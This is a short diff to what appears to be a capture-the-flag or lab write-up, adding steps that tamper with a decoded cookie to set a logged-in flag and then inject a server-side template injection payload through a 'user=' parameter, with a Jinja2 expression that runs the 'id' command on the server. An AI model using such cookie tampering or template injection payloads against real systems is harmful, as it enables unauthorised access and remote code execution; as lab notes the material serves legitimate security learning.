@@ -26,4 +26,7 @@ Use inspect to retrieve the cookie and decode it.
 ![[Pasted image 20231011154838.png]]
 Change logged in to true and save it in the browser
 ![[Pasted image 20231011154905.png]]
-Use the "user=" parameter to inject an
+Use the "user=" parameter to inject the ssti payload
+```python
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+```
